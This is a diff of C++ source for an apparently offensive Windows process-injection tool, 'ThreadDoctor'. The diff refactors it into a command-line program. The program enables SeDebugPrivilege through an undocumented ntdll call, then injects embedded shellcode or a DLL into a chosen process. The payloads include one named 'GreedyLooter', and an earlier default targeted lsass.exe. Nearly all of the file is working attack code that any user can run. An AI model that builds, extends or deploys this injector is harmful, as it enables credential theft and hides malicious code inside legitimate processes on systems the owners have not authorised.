@@ -1,26 +1,26 @@
 #include <Windows.h>
 #include <TlHelp32.h>
 #include <string>
+#include <iostream>
+#include <SubAuth.h>
+#include <tuple>
 #include "resource.h"
 
 #define SE_DEBUG_PRIVILEGE 20
 
-// Shellcode resources used in shellcodeInject
-// Import shellcode resource:
-// https://ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources
-//HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_CALC1), L"CALC");
-HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_GREEDYLOOTER1), L"GREEDYLOOTER");
-DWORD cShellcodeSize = SizeofResource(NULL, shellcodeResource);
-HGLOBAL cShellcode = LoadResource(NULL, shellcodeResource);
+//TODO:
+// - Implement Error Checking
+// - add x86 payloads
+// - CreateThread
+// - Thread Hijack
+// - Various APC
+// - memory map
 
-// if shellcode is literal must be unsigned char type
-// const unsigned char* literals have a max size of 65535
-
-// dll path used in dllPathInject
-const LPCWSTR cDllPath = L"C:\\Users\\User\\Source\\Repos\\GreedyLooter\\x64\\Release\\GreedyLooter.dll";
+enum class InjType { None, RemoteThread, DLLPath};
+enum class Payload { None, Calculator, Commandline, GreedyLooter};
 
 // get Process ID by process name
-DWORD getPID(LPCWSTR procName = L"lsass.exe") {
+DWORD getPID(LPCWSTR procName) {
 
 	// take snapshot of current process
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -41,7 +41,7 @@ DWORD getPID(LPCWSTR procName = L"lsass.exe") {
 }
 
 // inject the dllpath into the remote process, then start a remote thread calling LoadLibrary on dllPath
-BOOL dllPathInject(DWORD processId, LPCWSTR dllPath = cDllPath) {
+BOOL dllPathInject(DWORD processId, LPCWSTR dllPath) {
 	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
 
 	// Allocate Buffer for dllPath in remote process
@@ -69,14 +69,14 @@ EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
 
 // Runtime libraries enable privileges, native api method of changing privileges (undocumented ntdll function)
 // returns previous debug privilege state
-BOOLEAN setRtlSEDebug() {
+NTSTATUS setRtlSEDebug() {
 	BOOLEAN bPreviousPrivilegeStatus = FALSE; 
-    RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &bPreviousPrivilegeStatus);
-	return bPreviousPrivilegeStatus;
+    NTSTATUS status = RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &bPreviousPrivilegeStatus);
+	return status;
 }
 
 // inject shellcode into remote process then start remote thread calling shellcode
-BOOL shellcodeInject(DWORD processId, HGLOBAL shellcode = cShellcode, const size_t shellcodeSize = cShellcodeSize) {
+BOOL createRemoteThreadInject(DWORD processId, HGLOBAL shellcode, const size_t shellcodeSize) {
 	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
 
 	// Allocate Buffer for shellcode in remote process
@@ -89,20 +89,125 @@ BOOL shellcodeInject(DWORD processId, HGLOBAL shellcode = cShellcode, const size
 	return true;
 }
 
-// first argument will be the process ID
-int wmain(int argc, wchar_t *argv[])
-{
-	DWORD processId;
-	// edgecase: process-name begins with number
-	if (isdigit(argv[1][0])) {
-		processId = _wtoi(argv[1]);
-	}else{
-		processId = getPID(argv[1]);
+// Shellcode resources used in shellcodeInject
+// Import payload resource:
+// https://ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources
+std::tuple<HGLOBAL,DWORD> getPayload(Payload payload) {
+	HRSRC shellcodeResource;
+	switch (payload) {
+	case Payload::Calculator:
+		shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_CALC1), L"CALC");
+		break;
+	case Payload::Commandline:
+		shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_CMD1), L"CMD");
+		break;
+	case Payload::GreedyLooter:
+		shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_GREEDYLOOTER1), L"GREEDYLOOTER");
+		break;
+	default:
+		wprintf(L"[!] Invalid payload %d", payload);
+		exit(1);
+	}
+	if (shellcodeResource == NULL) {
+		wprintf(L"[!] Payload resource not found");
+		exit(1);
 	}
 
-	setRtlSEDebug();
-	shellcodeInject(processId);
-	//dllPathInject(processId);
+	// if shellcode is literal must be unsigned char type
+	// const unsigned char* literals have a max size of 65535
+	HGLOBAL cShellcode = LoadResource(NULL, shellcodeResource);
+	DWORD cShellcodeSize = SizeofResource(NULL, shellcodeResource);
+	return { cShellcode,cShellcodeSize };
+}
+
+// prints commandline usage
+int printUsage() {
+	wprintf(L"Usage: ThreadDoctor.exe <-t Injection-Type> <-p Payload> {-n ProcessName|-d ProcessID}\n");
+	wprintf(L"  -t <type>          Injection type (1: RemoteThread, 2: DLLPath)\n");
+	wprintf(L"  -p <payload>       x64 payload to use (1: Calculator, 2: Commandline, 2: GreedyLooter)\n");
+	return 0;
+}
+
+int wmain(int argc, wchar_t *argv[])
+{
+	// commandline Argument parser spaghetti (could use cxxopts or Boost.Program_Options)
+	DWORD processId = -1;
+	InjType type = InjType::None;
+	Payload payload = Payload::None;
+	LPCWSTR dllPath = L"";
+	if (argc <= 1) {
+		printUsage();
+		exit(1);
+	}
+	for (int i = 1; i < argc; i++) {
+		if (!wcscmp(argv[i], L"-h") || !wcscmp(argv[i], L"--help")) {
+			printUsage();
+			exit(0);
+		}
+		else if (!wcscmp(argv[i], L"-d")) {
+			processId = _wtoi(argv[i + 1]);
+			i++;
+		}
+		else if (!wcscmp(argv[i], L"-n")) {
+			processId = getPID(argv[i + 1]);
+			i++;
+		}
+		else if(!wcscmp(argv[i],L"-t")){
+			type = static_cast<InjType>(_wtoi(argv[i + 1]));
+			i++;
+		}
+		else if(!wcscmp(argv[i],L"-p")){
+			payload = static_cast<Payload>(_wtoi(argv[i + 1]));
+			i++;
+		}
+		else if(!wcscmp(argv[i],L"-f")){
+			dllPath = argv[i+1];
+			i++;
+		}
+		else {
+			wprintf(L"[!] Bad argument %s", argv[i]);
+			exit(1);
+		}
+	}
+	if (processId == -1 || type == InjType::None) {
+		printUsage();
+		exit(1);
+	}
+	if (processId <= 0 || processId == NULL) {
+		wprintf(L"[!] Process name not found");
+		exit(1);
+	}
+
+	// set debug privileges
+	NTSTATUS status = setRtlSEDebug();
+	if (!NT_SUCCESS(status) || status == 0x00000061) {
+		wprintf(L"[!] Enable RtlAdjustPrivilege failed");
+		exit(1);
+	}
+
+	// Injection type cases
+	switch (type) {
+	case InjType::RemoteThread:
+	{
+		std::tuple<HGLOBAL,DWORD> shellcode = getPayload(payload);
+		createRemoteThreadInject(processId, std::get<0>(shellcode), std::get<1>(shellcode));
+		break;
+	}
+	case InjType::DLLPath:
+	{
+		// dllpath injection argument check
+		if (type == InjType::DLLPath && (lstrcmpW(dllPath, L"") == 0)) {
+			wprintf(L"[!] DLL path needed for dll path injection");
+			exit(1);
+		}
+
+		dllPathInject(processId, dllPath);
+		break;
+	}
+	default:
+		wprintf(L"[!] Invalid injection type %d", type);
+		exit(1);
+	}
 
 	return 0;
 }
